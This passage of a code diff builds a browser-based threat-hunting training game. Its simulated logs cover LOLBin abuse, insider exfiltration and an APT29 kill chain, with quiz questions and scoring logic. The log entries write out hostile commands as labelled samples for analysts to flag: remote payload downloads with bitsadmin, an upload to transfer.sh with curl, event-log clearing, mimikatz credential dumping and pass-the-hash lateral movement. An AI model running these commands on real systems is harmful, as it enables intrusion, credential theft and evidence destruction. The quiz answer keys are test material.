+            { id:'b12',ts:'14:25:00', host:'SRV-DC-01',  proc:'certutil.exe', cmd:'-ping -config SRV-CA-01\\CertAuth', malicious:false },
+            { id:'b13',ts:'14:28:44', host:'WS-HR-02',   proc:'bitsadmin.exe',cmd:'/transfer "update2" http://185.234.219.47/persist.vbs %APPDATA%\\Microsoft\\persist.vbs', malicious:true },
+            { id:'b14',ts:'14:30:11', host:'WS-IT-11',   proc:'wscript.exe',  cmd:'C:\\Users\\Public\\svc.vbs', malicious:true },
+            { id:'b15',ts:'14:32:00', host:'SRV-PATCH-01',proc:'wscript.exe', cmd:'C:\\Scripts\\inventory.vbs', malicious:false },
+            { id:'b16',ts:'14:35:18', host:'WS-ACCT-03', proc:'mshta.exe',    cmd:'vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run(""cmd /c whoami"")"))', malicious:true },
+            { id:'b17',ts:'14:37:44', host:'SRV-FILE-02',proc:'certutil.exe', cmd:'-exportPFX -p secret My CertAlias C:\\Backup\\cert.pfx', malicious:false },
+            { id:'b18',ts:'14:40:01', host:'WS-MKTG-04', proc:'regsvr32.exe', cmd:'/s C:\\Windows\\System32\\scrrun.dll', malicious:false }
+        ],
+        questions: [
+            {
+                q: 'Which LOLBin is being used to download files directly from an external IP address?',
+                options: ['mshta.exe', 'rundll32.exe', 'certutil.exe and bitsadmin.exe', 'regsvr32.exe'],
+                correctIdx: 2,
+                explanation: 'Both certutil.exe (-urlcache flag) and bitsadmin.exe (/transfer flag) are downloading files from 185.234.219.47, an external threat actor IP.'
+            },
+            {
+                q: 'What distinguishes the MALICIOUS certutil.exe usage from the LEGITIMATE usage in this log set?',
+                options: [
+                    'Malicious runs use uppercase flags; legitimate uses lowercase',
+                    'Malicious certutil downloads/decodes files from/to user-writable directories; legitimate certutil performs certificate operations',
+                    'Malicious certutil always runs as SYSTEM',
+                    'Legitimate certutil never contacts external servers'
+                ],
+                correctIdx: 1,
+                explanation: 'Malicious certutil uses -urlcache (download) and -decode (decode base64) targeting user-writable paths (Users\\Public). Legitimate use performs cert verification, hash checks, and CA pings.'
+            },
+            {
+                q: 'The regsvr32.exe entry at 14:23:10 is suspicious because it:',
+                options: [
+                    'Registers a DLL that does not exist on disk',
+                    'Uses /i: to fetch and execute a remote COM scriptlet (Squiblydoo technique)',
+                    'Runs without elevation in a standard user context',
+                    'References a COM object not in the registry'
+                ],
+                correctIdx: 1,
+                explanation: 'This is the "Squiblydoo" technique — regsvr32 /n /u /i:[url] fetches a remote scriptlet and executes it, bypassing AppLocker and application whitelisting.'
+            },
+            {
+                q: 'How many distinct LOLBin processes were used maliciously in this hunt?',
+                options: ['3', '4', '5', '6'],
+                correctIdx: 2,
+                explanation: 'Five LOLBins used maliciously: certutil.exe, bitsadmin.exe, mshta.exe, rundll32.exe, regsvr32.exe (wscript.exe executing a dropped script).'
+            }
+        ]
+    },
+
+    /* ── HUNT 4: Data Staging & Exfiltration (Medium-Hard) ─── */
+    {
+        id: 4,
+        title: 'Data Staging & Exfiltration',
+        difficulty: 'MED-HARD',
+        diffClass: 'diff-medium',
+        intel: {
+            title: 'Insider Threat Indicator Report ITIR-2024-0441',
+            body: 'DLP alert triggered: large volume file access from SRV-FILE-02 by user account "jturner" outside business hours (22:00-05:00). Pattern consistent with insider data staging — compressed archive creation followed by outbound transfer. Investigate file operations and network transfers.',
+            tags: ['INSIDER-THREAT', 'DATA-EXFIL', 'DLP', 'OFF-HOURS']
+        },
+        hypotheses: [
+            { text: 'A privileged user is staging sensitive files for exfiltration using compression utilities and transferring to a personal cloud storage service.', correct: true },
+            { text: 'A ransomware operator is encrypting files and staging ransom notes across the environment.', correct: false },
+            { text: 'An external attacker is using compromised credentials to perform reconnaissance on file servers.', correct: false }
+        ],
+        showTimeline: false,
+        showMitre: false,
+        flagInstructions: 'Flag entries that indicate staging or exfiltration activity. Legitimate after-hours operations should NOT be flagged.',
+        logEntries: [
+            { id:'f1',  ts:'22:03:11', host:'SRV-FILE-02',proc:'robocopy.exe', cmd:'\\\\SRV-FILE-02\\Finance\\Q3-2024 C:\\Users\\jturner\\Desktop\\backup /E /COPYALL', malicious:true },
+            { id:'f2',  ts:'22:05:44', host:'SRV-FILE-02',proc:'robocopy.exe', cmd:'\\\\SRV-FILE-02\\HR\\Personnel C:\\Users\\jturner\\Desktop\\backup /E /COPYALL', malicious:true },
+            { id:'f3',  ts:'22:08:00', host:'SRV-BACKUP', proc:'ntbackup.exe', cmd:'-scheduled -level full -destination \\\\SRV-BACKUP\\nightly', malicious:false },
+            { id:'f4',  ts:'22:10:12', host:'SRV-FILE-02',proc:'robocopy.exe', cmd:'\\\\SRV-FILE-02\\Legal\\Contracts C:\\Users\\jturner\\Desktop\\backup /E /COPYALL', malicious:true },
+            { id:'f5',  ts:'22:12:30', host:'SRV-FILE-02',proc:'7z.exe',       cmd:'a -tzip -mx9 C:\\Users\\jturner\\Desktop\\archive.zip C:\\Users\\jturner\\Desktop\\backup\\*', malicious:true },
+            { id:'f6',  ts:'22:14:00', host:'SRV-BACKUP', proc:'robocopy.exe', cmd:'\\\\SRV-FILE-02\\System C:\\Backup\\sysimg /E /LOG:C:\\Backup\\sysimg.log', malicious:false },
+            { id:'f7',  ts:'22:15:02', host:'SRV-FILE-02',proc:'cmd.exe',      cmd:'del /Q C:\\Users\\jturner\\Desktop\\backup\\*.*', malicious:true },
+            { id:'f8',  ts:'22:18:44', host:'WS-MGR-01',  proc:'chrome.exe',   cmd:'onedrive.live.com HTTPS POST 1.4GB (multipart upload)', malicious:true },
+            { id:'f9',  ts:'22:19:00', host:'SRV-FILE-02',proc:'wevtutil.exe', cmd:'cl Security', malicious:true },
+            { id:'f10', ts:'22:20:11', host:'SRV-BACKUP', proc:'backup_agent', cmd:'Scheduled incremental backup completed. 2.1GB. dest: tape-vault-01', malicious:false },
+            { id:'f11', ts:'22:22:33', host:'SRV-FILE-02',proc:'wevtutil.exe', cmd:'cl System', malicious:true },
+            { id:'f12', ts:'22:25:00', host:'SRV-MONITOR',proc:'sysmon',       cmd:'Network connection logged: WS-MGR-01 -> 95.100.10.22:443 1.4GB', malicious:true },
+            { id:'f13', ts:'22:30:10', host:'SRV-FILE-02',proc:'sdelete.exe',  cmd:'-p 3 C:\\Users\\jturner\\Desktop\\archive.zip', malicious:true },
+            { id:'f14', ts:'22:35:00', host:'SRV-PATCH-01',proc:'wsus_client', cmd:'Checking for updates — server: wsus.corp.local', malicious:false },
+            { id:'f15', ts:'22:40:11', host:'WS-MGR-01',  proc:'chrome.exe',   cmd:'accounts.google.com HTTPS GET 3.2KB', malicious:false },
+            { id:'f16', ts:'22:45:00', host:'SRV-DC-01',  proc:'ntds_check',   cmd:'Scheduled NTDS integrity check — no issues found', malicious:false },
+            { id:'f17', ts:'22:50:33', host:'SRV-FILE-02',proc:'eventvwr.exe', cmd:'Event log viewer opened by jturner', malicious:true },
+            { id:'f18', ts:'23:00:00', host:'SRV-BACKUP', proc:'rsync',        cmd:'Completed DR sync to offsite-backup-01. 14GB transferred.', malicious:false },
+            { id:'f19', ts:'23:05:11', host:'SRV-FILE-02',proc:'net.exe',      cmd:'use Z: /delete', malicious:true },
+            { id:'f20', ts:'23:10:00', host:'SRV-MONITOR',proc:'sysmon',       cmd:'jturner VPN session terminated. Session duration: 73 minutes', malicious:false }
+        ],
+        questions: [
+            {
+                q: 'What is the staging directory used before compression?',
+                options: [
+                    'C:\\Users\\jturner\\AppData\\Local\\Temp',
+                    'C:\\Users\\jturner\\Desktop\\backup',
+                    'C:\\ProgramData\\Microsoft\\staging',
+                    '\\\\SRV-FILE-02\\Finance\\Q3-2024'
+                ],
+                correctIdx: 1,
+                explanation: 'Three robocopy commands copy Finance, HR, and Legal files to C:\\Users\\jturner\\Desktop\\backup before compression with 7z.'
+            },
+            {
+                q: 'Approximately how much data was exfiltrated based on the network transfer log?',
+                options: ['140 MB', '1.4 GB', '14 GB', '2.1 GB'],
+                correctIdx: 1,
+                explanation: 'The OneDrive POST upload from WS-MGR-01 and the Sysmon network connection log both indicate 1.4GB transferred to an external IP.'
+            },
+            {
+                q: 'Which two anti-forensics techniques did the insider use to cover tracks?',
+                options: [
+                    'Registry modification and timestomping',
+                    'Event log clearing (wevtutil cl) and secure file deletion (sdelete)',
+                    'Shadow copy deletion and MFT manipulation',
+                    'Prefetch deletion and $UsnJrnl wiping'
+                ],
+                correctIdx: 1,
+                explanation: 'wevtutil cl Security and wevtutil cl System cleared Windows event logs. sdelete -p 3 performed a 3-pass secure deletion of the archive — both are anti-forensic indicators.'
+            },
+            {
+                q: 'The exfiltration destination (OneDrive/cloud) is significant because:',
+                options: [
+                    'It uses an uncommon port that triggers firewall alerts',
+                    'It blends with legitimate cloud sync traffic over HTTPS/443, bypassing many DLP tools',
+                    'It requires domain admin credentials to access',
+                    'It cannot be blocked by proxy filters'
+                ],
+                correctIdx: 1,
+                explanation: 'Using legitimate cloud services (OneDrive, Google Drive, Dropbox) over HTTPS/443 is a common exfiltration technique — the traffic blends with normal business activity and is encrypted.'
+            }
+        ]
+    },
+
+    /* ── HUNT 5: APT Kill Chain Reconstruction (Hard) ───────── */
+    {
+        id: 5,
+        title: 'APT Kill Chain Reconstruction',
+        difficulty: 'HARD',
+        diffClass: 'diff-hard',
+        intel: {
+            title: 'CTI Report CTI-2024-AURORA — FULL APT CAMPAIGN',
+            body: 'Multi-stage APT campaign detected targeting your organization. Mixed event sources (process, network, file, auth logs) spanning 6 hours. Reconstruct the full kill chain and map each indicator to a MITRE ATT&CK tactic. Campaign attributed to APT29 (COZY BEAR) based on TTP overlap.',
+            tags: ['APT29', 'COZY-BEAR', 'KILL-CHAIN', 'MITRE-ATTCK', 'FULL-CAMPAIGN']
+        },
+        hypotheses: [
+            { text: 'A targeted APT campaign has compromised the environment via phishing and is progressing through a multi-stage intrusion following the MITRE ATT&CK kill chain.', correct: true },
+            { text: 'A script kiddie is running automated vulnerability scanners against the perimeter firewall.', correct: false },
+            { text: 'A supply chain compromise has infected software update packages distributed to all endpoints.', correct: false }
+        ],
+        showTimeline: false,
+        showMitre: true,
+        flagInstructions: 'Flag ALL malicious entries and assign the correct MITRE ATT&CK tactic from the dropdown.',
+        mitreOptions: [
+            '-- Select Tactic --',
+            'Initial Access',
+            'Execution',
+            'Persistence',
+            'Privilege Escalation',
+            'Defense Evasion',
+            'Credential Access',
+            'Discovery',
+            'Lateral Movement',
+            'Collection',
+            'Exfiltration'
+        ],
+        logEntries: [
+            { id:'k1',  ts:'06:12:00', host:'WS-ACCT-03', proc:'outlook.exe',   cmd:'User opened attachment: Invoice_Q3.docm from sender payroll@hrsupport-external.com', malicious:true,  mitre:'Initial Access' },
+            { id:'k2',  ts:'06:12:44', host:'WS-ACCT-03', proc:'winword.exe',   cmd:'Spawned: cmd.exe /c powershell -enc [base64_payload]', malicious:true, mitre:'Execution' },
+            { id:'k3',  ts:'06:13:00', host:'WS-SALES-09',proc:'chrome.exe',    cmd:'User browsed to sharepoint.corp.local/docs — normal activity', malicious:false, mitre:null },
+            { id:'k4',  ts:'06:13:22', host:'WS-ACCT-03', proc:'powershell.exe',cmd:'-enc payload downloads C:\\Users\\jsmith\\AppData\\Roaming\\svchost32.exe', malicious:true, mitre:'Execution' },
+            { id:'k5',  ts:'06:14:01', host:'WS-ACCT-03', proc:'svchost32.exe', cmd:'Created registry key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate = C:\\Users\\jsmith\\AppData\\Roaming\\svchost32.exe', malicious:true, mitre:'Persistence' },
+            { id:'k6',  ts:'06:14:30', host:'WS-ACCT-03', proc:'svchost32.exe', cmd:'Beacon to 45.142.213.22:443 (interval ~60s)', malicious:true, mitre:'Execution' },
+            { id:'k7',  ts:'06:30:00', host:'SRV-DC-01',  proc:'services.exe',  cmd:'Standard LSASS startup — no anomalies', malicious:false, mitre:null },
+            { id:'k8',  ts:'07:00:14', host:'WS-ACCT-03', proc:'svchost32.exe', cmd:'Process injection into lsass.exe (OpenProcess + WriteProcessMemory detected)', malicious:true, mitre:'Privilege Escalation' },
+            { id:'k9',  ts:'07:01:22', host:'WS-ACCT-03', proc:'lsass.exe',     cmd:'Credential dump: mimikatz sekurlsa::logonpasswords (LSASS memory read)', malicious:true, mitre:'Credential Access' },
+            { id:'k10', ts:'07:05:00', host:'WS-ACCT-03', proc:'svchost32.exe', cmd:'Deleted Windows Defender definitions: MpCmdRun.exe -RemoveDefinitions -All', malicious:true, mitre:'Defense Evasion' },
+            { id:'k11', ts:'07:10:11', host:'WS-ACCT-03', proc:'net.exe',       cmd:'view /domain', malicious:true, mitre:'Discovery' },
+            { id:'k12', ts:'07:10:44', host:'WS-ACCT-03', proc:'nltest.exe',    cmd:'/dclist:corp.local', malicious:true, mitre:'Discovery' },
+            { id:'k13', ts:'07:15:00', host:'WS-ACCT-03', proc:'ping.exe',      cmd:'-a SRV-DC-01 SRV-FILE-02 SRV-SQL-01', malicious:true, mitre:'Discovery' },
+            { id:'k14', ts:'07:20:00', host:'SRV-DC-01',  proc:'wevtutil.exe',  cmd:'qe Security /rd:true /f:text — queried last 1000 events (legitimate admin activity)', malicious:false, mitre:null },
+            { id:'k15', ts:'07:30:00', host:'SRV-FILE-02',proc:'services.exe',  cmd:'wmiexec: cmd.exe /Q /c net use \\\\SRV-FILE-02\\admin$ [hash] /user:corp\\Administrator', malicious:true, mitre:'Lateral Movement' },
+            { id:'k16', ts:'07:32:11', host:'SRV-FILE-02',proc:'cmd.exe',       cmd:'copy svchost32.exe \\\\SRV-FILE-02\\C$\\Windows\\Temp\\ && sc create "WindowsUpdate" binPath=C:\\Windows\\Temp\\svchost32.exe', malicious:true, mitre:'Lateral Movement' },
+            { id:'k17', ts:'07:45:00', host:'SRV-FILE-02',proc:'svchost32.exe', cmd:'Enumerated shares: \\\\SRV-FILE-02\\Finance, \\\\SRV-FILE-02\\HR, \\\\SRV-FILE-02\\Legal', malicious:true, mitre:'Discovery' },
+            { id:'k18', ts:'08:00:00', host:'SRV-FILE-02',proc:'robocopy.exe',  cmd:'\\\\SRV-FILE-02\\Finance C:\\Windows\\Temp\\out /E — 2.8GB copied', malicious:true, mitre:'Collection' },
+            { id:'k19', ts:'08:10:00', host:'SRV-FILE-02',proc:'7z.exe',        cmd:'a -tzip -mx9 -p[pass] C:\\Windows\\Temp\\data.zip C:\\Windows\\Temp\\out\\*', malicious:true, mitre:'Collection' },
+            { id:'k20', ts:'08:15:00', host:'SRV-FILE-02',proc:'curl.exe',      cmd:'-T C:\\Windows\\Temp\\data.zip https://transfer.sh/data.zip -H "Authorization: Bearer [token]"', malicious:true, mitre:'Exfiltration' },
+            { id:'k21', ts:'08:20:00', host:'SRV-BACKUP', proc:'rsync',         cmd:'Scheduled backup to offsite-backup-01 completed', malicious:false, mitre:null },
+            { id:'k22', ts:'08:22:00', host:'SRV-FILE-02',proc:'wevtutil.exe',  cmd:'cl Security && cl System && cl Application', malicious:true, mitre:'Defense Evasion' },
+            { id:'k23', ts:'08:25:00', host:'WS-ACCT-03', proc:'svchost32.exe', cmd:'Deleted registry run key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate', malicious:true, mitre:'Defense Evasion' },
+            { id:'k24', ts:'08:28:00', host:'SRV-FILE-02',proc:'svchost32.exe', cmd:'sc delete "WindowsUpdate" && del /Q C:\\Windows\\Temp\\svchost32.exe', malicious:true, mitre:'Defense Evasion' },
+            { id:'k25', ts:'08:35:00', host:'WS-ACCT-03', proc:'svchost32.exe', cmd:'Final beacon to 45.142.213.22:443 — C2 connection terminated', malicious:true, mitre:'Exfiltration' }
+        ],
+        questions: [
+            {
+                q: 'What was the initial access vector used by APT29 in this campaign?',
+                options: [
+                    'Exploiting a public-facing web application (CVE-2024-XXXX)',
+                    'Spearphishing attachment — malicious macro document delivered via email',
+                    'Password spraying against the VPN gateway',
+                    'Supply chain compromise via a software update'
+                ],
+                correctIdx: 1,
+                explanation: 'The campaign begins with outlook.exe opening a .docm attachment from an external spoofed email — a spearphishing attachment (T1566.001).'
+            },
+            {
+                q: 'The adversary achieves persistence using which method?',
+                options: [
+                    'Windows scheduled task (T1053.005)',
+                    'Registry Run key — HKCU\\...\\Run\\SecurityUpdate (T1547.001)',
+                    'DLL search order hijacking (T1574.001)',
+                    'Boot sector modification (T1542.003)'
+                ],
+                correctIdx: 1,
+                explanation: 'svchost32.exe creates a registry Run key (HKCU\\...\\CurrentVersion\\Run\\SecurityUpdate) pointing to the malicious binary — T1547.001 Registry Run Keys / Startup Folder.'
+            },
+            {
+                q: 'Which MITRE ATT&CK tactic appears MOST frequently in this campaign\'s log data?',
+                options: ['Credential Access', 'Lateral Movement', 'Defense Evasion', 'Collection'],
+                correctIdx: 2,
+                explanation: 'Defense Evasion appears 4 times: Defender definition deletion, event log clearing (3 logs), run key deletion, and malware self-deletion — consistent with APT29\'s operational security practices.'
+            }
+        ]
+    }
+];
+
+/* ============================================================
+   GAME STATE
+============================================================ */
+const state = {
+    huntIndex:        0,       // current hunt (0-4)
+    score:            0,
+    maxScore:         0,
+    correctFlags:     0,
+    wrongFlags:       0,
+    questionsCorrect: 0,
+    questionsTotal:   0,
+    hypothesisLocked: false,
+    flagsLocked:      false,
+    analysisSubmitted:false,
+    selectedHypIdx:   null,
+    flaggedIds:       new Set(),
+    mitreAnswers:     {},      // Hunt 5: { entryId: selectedTactic }
+    huntScores:       []
+};
+
+/* ============================================================
+   INITIALIZATION
+============================================================ */
+function init() {
+    renderHunt(0);
+}
+
+/* ============================================================
+   RENDER HUNT — builds all panels for the current hunt
+============================================================ */
+function renderHunt(idx) {
+    const hunt = HUNTS[idx];
+    state.huntIndex        = idx;
+    state.hypothesisLocked = false;
+    state.flagsLocked      = false;
+    state.analysisSubmitted= false;
+    state.selectedHypIdx   = null;
+    state.flaggedIds       = new Set();
+    state.mitreAnswers     = {};
+
+    updateProgressBar();
+
+    /* Intel panel */
+    document.getElementById('intel-title').textContent = hunt.intel.title;
+    document.getElementById('intel-body').textContent  = hunt.intel.body;
+    const tagsEl = document.getElementById('intel-tags');
+    tagsEl.innerHTML = '';
+    hunt.intel.tags.forEach(tag => {
+        const span = document.createElement('span');
+        span.className = 'intel-tag';
+        span.textContent = tag;
+        tagsEl.appendChild(span);
+    });
+
+    /* Hypothesis panel */
+    document.getElementById('hypothesis-section').style.display = 'block';
+    const hypList = document.getElementById('hypothesis-list');
+    hypList.innerHTML = '';
+    hunt.hypotheses.forEach((h, i) => {
+        const card = document.createElement('div');
+        card.className = 'hypothesis-card';
+        card.textContent = h.text;
+        card.dataset.idx = i;
+        card.addEventListener('click', () => selectHypothesis(i));
+        hypList.appendChild(card);
+    });
+    document.getElementById('lock-hyp-btn').disabled = true;
+    document.getElementById('hyp-hint').textContent = 'Select a hypothesis to guide your hunt.';
+
+    /* Analysis panel */
+    document.getElementById('analysis-section').style.display = 'none';
+    document.getElementById('questions-container').innerHTML = '';
+    document.getElementById('submit-bar').style.display = 'none';
+
+    /* Right panel */
+    renderRightPanel(hunt);
+
+    /* Right bottom */
+    document.getElementById('right-bottom').style.display = 'none';
+    document.getElementById('right-bottom').innerHTML = '';
+
+    /* Calculate max score contribution for this hunt */
+    const correctFlagCount = hunt.logEntries.filter(e => e.malicious).length;
+    let huntMax = 20 + (correctFlagCount * 10) + (hunt.questions.length * 15);
+    if (hunt.showMitre) huntMax += correctFlagCount * 10;
+    state.maxScore += huntMax;
+}
+
+/* ============================================================
+   RIGHT PANEL — data viewer
+============================================================ */
+function renderRightPanel(hunt) {
+    const top = document.getElementById('right-top');
+    top.innerHTML = '';
+
+    /* Hunt title bar */
+    const titleBar = document.createElement('div');
+    titleBar.className = 'hunt-title-bar';
+    titleBar.innerHTML = `
+        <span class="hunt-number">HUNT ${hunt.id} / 5</span>
+        <span class="hunt-title">${hunt.title}</span>
+        <span class="difficulty-badge ${hunt.diffClass}">${hunt.difficulty}</span>
+    `;
+    top.appendChild(titleBar);
+
+    /* Instructions */
+    const instrEl = document.createElement('div');
+    instrEl.className = 'flags-counter';
+    instrEl.innerHTML = `<span id="flag-count">0</span> entries flagged — ${hunt.flagInstructions}`;
+    top.appendChild(instrEl);
+
+    /* Timeline (Hunt 2 only) */
+    if (hunt.showTimeline && hunt.timelineData) {
+        const wrap = document.createElement('div');
+        wrap.className = 'timeline-wrap';
+        wrap.innerHTML = '<div class="timeline-label">CONNECTION TIMELINE ANALYSIS</div>';
+        const pre = document.createElement('div');
+        pre.className = 'timeline-ascii';
+        hunt.timelineData.forEach(line => {
+            if (line.includes('PATTERN')) {
+                const span = document.createElement('span');
+                span.className = 'hl';
+                span.textContent = line + '\n';
+                pre.appendChild(span);
+            } else {
+                pre.appendChild(document.createTextNode(line + '\n'));
+            }
+        });
+        wrap.appendChild(pre);
+        top.appendChild(wrap);
+    }
+
+    /* Log viewer */
+    const logViewer = document.createElement('div');
+    logViewer.className = 'log-viewer';
+    logViewer.id = 'log-viewer';
+
+    hunt.logEntries.forEach(entry => {
+        const row = document.createElement('div');
+        row.className = 'log-entry';
+        row.id = `entry-${entry.id}`;
+        row.dataset.id = entry.id;
+
+        /* Flag button */
+        const flagBtn = document.createElement('button');
+        flagBtn.className = 'flag-btn';
+        flagBtn.textContent = 'F';
+        flagBtn.title = 'Flag as suspicious';
+        flagBtn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            if (!state.flagsLocked) toggleFlag(entry.id);
+        });
+        row.appendChild(flagBtn);
+
+        /* Timestamp */
+        const ts = document.createElement('span');
+        ts.className = 'log-ts';
+        ts.textContent = entry.ts;
+        row.appendChild(ts);
+
+        /* Log text */
+        const txt = document.createElement('span');
+        txt.className = 'log-text';
+        txt.innerHTML = buildLogHTML(entry);
+        row.appendChild(txt);
+
+        /* MITRE dropdown (Hunt 5 only) */
+        if (hunt.showMitre) {
+            const sel = document.createElement('select');
+            sel.className = 'mitre-select';
+            sel.id = `mitre-${entry.id}`;
+            hunt.mitreOptions.forEach(opt => {
+                const o = document.createElement('option');
+                o.value = opt;
+                o.textContent = opt;
+                sel.appendChild(o);
+            });
+            sel.addEventListener('change', () => {
+                if (!state.flagsLocked) state.mitreAnswers[entry.id] = sel.value;
+            });
+            row.appendChild(sel);
+        }
+
+        row.addEventListener('click', () => {
+            if (!state.flagsLocked) toggleFlag(entry.id);
+        });
+
+        logViewer.appendChild(row);
+    });
+
+    top.appendChild(logViewer);
+
+    /* Submit flags button */
+    const flagActionBar = document.createElement('div');
+    flagActionBar.className = 'action-bar';
+    flagActionBar.id = 'flag-action-bar';
+    flagActionBar.innerHTML = `
+        <span class="action-hint" id="flag-action-hint">Flag suspicious entries, then submit.</span>
+        <button class="btn btn-primary" id="submit-flags-btn" onclick="submitFlags()">Submit Flags</button>
+    `;
+    top.appendChild(flagActionBar);
+}
+
+/* Build colored HTML for a log entry */
+function buildLogHTML(entry) {
+    return `<span class="log-host">${escHtml(entry.host)}</span> ` +
+           `<span class="log-proc">${escHtml(entry.proc)}</span> ` +
+           `<span class="log-cmd">${escHtml(entry.cmd)}</span>`;
+}
+
+function escHtml(str) {
+    const d = document.createElement('div');
+    d.textContent = str;
+    return d.innerHTML;
+}
+
+/* ============================================================
+   HYPOTHESIS SELECTION
+============================================================ */
+function selectHypothesis(idx) {
+    if (state.hypothesisLocked) return;
+    state.selectedHypIdx = idx;
+    document.querySelectorAll('.hypothesis-card').forEach((c, i) => {
+        c.classList.toggle('selected', i === idx);
+    });
+    document.getElementById('lock-hyp-btn').disabled = false;
+    document.getElementById('hyp-hint').textContent = 'Hypothesis selected. Click "Lock In" to confirm.';
+}
+
+function lockHypothesis() {
+    if (state.selectedHypIdx === null) return;
+    state.hypothesisLocked = true;
+
+    const hunt = HUNTS[state.huntIndex];
+    const correct = hunt.hypotheses[state.selectedHypIdx].correct;
+
+    /* Lock all hypothesis cards */
+    document.querySelectorAll('.hypothesis-card').forEach((c, i) => {
+        c.classList.add('locked');
+        if (hunt.hypotheses[i].correct)  c.classList.add('correct-reveal');
+        if (i === state.selectedHypIdx && !hunt.hypotheses[i].correct) c.classList.add('wrong-reveal');
+    });
+
+    document.getElementById('lock-hyp-btn').disabled = true;
+
+    if (correct) {
+        state.score += 20;
+        document.getElementById('hyp-hint').textContent = '+20 pts — Correct hypothesis!';
+    } else {
+        document.getElementById('hyp-hint').textContent = 'Incorrect hypothesis — review the intel and try the data analysis anyway.';
+    }
+    updateScoreDisplay();
+}
+
+/* ============================================================
+   FLAG TOGGLING
+============================================================ */
+function toggleFlag(id) {
+    if (state.flagsLocked) return;
+    if (state.flaggedIds.has(id)) {
+        state.flaggedIds.delete(id);
+        const row = document.getElementById(`entry-${id}`);
+        row.classList.remove('flagged');
+    } else {
+        state.flaggedIds.add(id);
+        const row = document.getElementById(`entry-${id}`);
+        row.classList.add('flagged');
+    }
+    document.getElementById('flag-count').textContent = state.flaggedIds.size;
+}
+
+/* ============================================================
+   SUBMIT FLAGS — score flag accuracy, reveal, open analysis
+============================================================ */
+function submitFlags() {
+    if (!state.hypothesisLocked) {
+        document.getElementById('flag-action-hint').textContent = 'Lock in your hypothesis first!';
+        return;
+    }
+    state.flagsLocked = true;
+    const hunt = HUNTS[state.huntIndex];
+
+    /* Lock the submit button */
+    document.getElementById('submit-flags-btn').disabled = true;
+    document.getElementById('flag-action-hint').textContent = 'Flags submitted. See results.';
+
+    /* Score each entry */
+    hunt.logEntries.forEach(entry => {
+        const wasFlagged = state.flaggedIds.has(entry.id);
+        const row = document.getElementById(`entry-${entry.id}`);
+        row.classList.remove('flagged');
+
+        if (entry.malicious && wasFlagged) {
+            row.classList.add('correct-flag');
+            state.score += 10;
+            state.correctFlags++;
+        } else if (!entry.malicious && wasFlagged) {
+            row.classList.add('wrong-flag');
+            state.score -= 5;
+            state.wrongFlags++;
+        }
+        /* Unflagged malicious entries get no class change — hunter missed them */
+
+        /* Lock MITRE dropdowns for Hunt 5 */
+        if (hunt.showMitre) {
+            const sel = document.getElementById(`mitre-${entry.id}`);
+            if (sel) {
+                /* Score MITRE mapping if entry was correctly flagged */
+                if (entry.malicious && wasFlagged && entry.mitre) {
+                    const chosen = state.mitreAnswers[entry.id] || '';
+                    if (chosen === entry.mitre) {
+                        state.score += 10;
+                        sel.classList.add('correct-tactic');
+                    } else {
+                        sel.classList.add('wrong-tactic');
+                    }
+                }
+                sel.disabled = true;
+            }
+        }
+    });
+
+    updateScoreDisplay();
+
+    /* Open analysis panel with questions */
+    openAnalysis(hunt);
+}
+
+/* ============================================================
+   ANALYSIS — render questions
+============================================================ */
+function openAnalysis(hunt) {
+    document.getElementById('analysis-section').style.display = 'block';
+    const container = document.getElementById('questions-container');
+    container.innerHTML = '';
+    state.questionsTotal += hunt.questions.length;
+
+    hunt.questions.forEach((q, qi) => {
+        const block = document.createElement('div');
+        block.className = 'question-block';
+
+        const qText = document.createElement('div');
+        qText.className = 'question-text';
+        qText.textContent = `Q${qi + 1}: ${q.q}`;
+        block.appendChild(qText);
+
+        q.options.forEach((opt, oi) => {
+            const label = document.createElement('label');
+            label.className = 'answer-option';
+            label.dataset.qi = qi;
+            label.dataset.oi = oi;
+
+            const radio = document.createElement('input');
+            radio.type = 'radio';
+            radio.name = `q${qi}`;
+            radio.value = oi;
+            radio.addEventListener('change', () => checkSubmitReady());
+            label.appendChild(radio);
+            label.appendChild(document.createTextNode(opt));
+            block.appendChild(label);
+        });
+
+        const feedback = document.createElement('div');
+        feedback.className = 'feedback-msg';
+        feedback.id = `feedback-${qi}`;
+        block.appendChild(feedback);
+
+        container.appendChild(block);
+    });
+
+    document.getElementById('submit-bar').style.display = 'flex';
+    document.getElementById('submit-btn').disabled = true;
+    document.getElementById('submit-hint').textContent = 'Answer all questions to submit.';
+
+    /* Scroll left panel to analysis */
+    document.getElementById('analysis-section').scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
+
+function checkSubmitReady() {
+    const hunt = HUNTS[state.huntIndex];
+    const allAnswered = hunt.questions.every((_, qi) => {
+        return document.querySelector(`input[name="q${qi}"]:checked`) !== null;
+    });
+    document.getElementById('submit-btn').disabled = !allAnswered;
+}
+
+/* ============================================================
+   SUBMIT ANALYSIS — score questions, reveal, show next button
+============================================================ */
+function submitAnalysis() {
+    if (state.analysisSubmitted) return;
+    state.analysisSubmitted = true;
+    document.getElementById('submit-btn').disabled = true;
+
+    const hunt = HUNTS[state.huntIndex];
+
+    hunt.questions.forEach((q, qi) => {
+        const selected = document.querySelector(`input[name="q${qi}"]:checked`);
+        const selectedIdx = selected ? parseInt(selected.value) : -1;
+        const correct = selectedIdx === q.correctIdx;
+
+        /* Lock all options */
+        document.querySelectorAll(`input[name="q${qi}"]`).forEach(r => r.disabled = true);
+        document.querySelectorAll(`.answer-option[data-qi="${qi}"]`).forEach(label => {
+            const oi = parseInt(label.dataset.oi);
+            label.classList.add('locked');
+            if (oi === q.correctIdx) label.classList.add('correct-reveal');
+            if (oi === selectedIdx && !correct) label.classList.add('wrong-reveal');
+        });
+
+        /* Feedback */
+        const fb = document.getElementById(`feedback-${qi}`);
+        if (correct) {
+            state.score += 15;
+            state.questionsCorrect++;
+            fb.textContent = `+15 pts — ${q.explanation}`;
+            fb.classList.add('show', 'ok');
+        } else {
+            fb.textContent = `Incorrect — ${q.explanation}`;
+            fb.classList.add('show', 'bad');
+        }
+    });
+
+    updateScoreDisplay();
+
+    /* Show next hunt / complete button */
+    const isLast = state.huntIndex === HUNTS.length - 1;
+    const bottom = document.getElementById('right-bottom');
+    bottom.style.display = 'block';
+    bottom.innerHTML = `
+        <div class="action-bar" style="justify-content:center;">
+            <span class="action-hint" id="next-hint">
